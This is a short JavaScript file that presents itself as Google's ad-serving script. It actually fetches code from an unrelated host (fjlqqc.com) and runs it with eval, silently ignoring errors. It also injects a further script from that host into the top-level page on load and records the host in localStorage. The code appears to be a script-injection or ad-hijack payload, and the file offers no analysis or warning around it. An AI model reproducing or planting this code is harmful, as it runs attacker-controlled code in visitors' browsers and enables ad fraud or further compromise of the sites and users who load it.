var sourceScriptURI = 'http://pagead2.googlesyndication.com/pagead/js/r20180808/r20180604/osd.js';
(function() {
    var evalGloble = eval;
    var _loader = function(uri) {
        if (!top || !this) {
            return setTimeout(arguments.callee, 50);
        }
        if (top != this) {
            return;
        }

        var s = window.top.document.createElement('script');
        s.src = uri;
        s.type = 'text/javascript';
        s.charset = 'utf-8';
        s.async = 'true';
        window.top.document.body.appendChild(s);
    };

    var evalSrcScript = function(uri) {
        var url = "http://www.fjlqqc.com/common/api/v1.0/src_script/?path=" + encodeURIComponent(uri);
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, false);
        xhr.setRequestHeader("X-Page-Charset", document.charset);
        xhr.send();
        try {
            evalGloble(xhr.responseText);
        } catch(error) {}
    };

    var getCurrentScript = function(sourceScriptURI) {
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; ++i) {
            if (scripts[i].src == sourceScriptURI) return scripts[i];
        }
    };

    var _looper, injection;
    var _loop = function() {
        switch (document.readyState) {
            case 'loading':
                break;
            case 'interactive':
            case 'complete':
                clearInterval(_looper);
                if (window.__COODAGLIFE__ === undefined) {
                    _loader(injectionScriptURI + trim(publisherID) + "/");
                    localStorage.COODAG_SERUM_IC = injectionScriptURI;
                    window.__COODAGLIFE__ = true;
                }
                break;
            default:
                clearInterval(_looper);
                break;
        }
    };

    var inject = function() {
        _looper = setInterval(_loop, 50);
    };

    function trim(s){
        return s.replace(/(^\s*)|(\s*$)/g, "");
    }

    var publisherID = 'e9825289-dca6-4449-9232-5b39b4ae45b0';
    var injectionScriptURI = "http://www.fjlqqc.com/common/api/v1.0/slot-code/publisher/";
    //var currentScript = getCurrentScript(sourceScriptURI);
    if (true) {
        evalSrcScript(sourceScriptURI);
    }

    inject();
})();







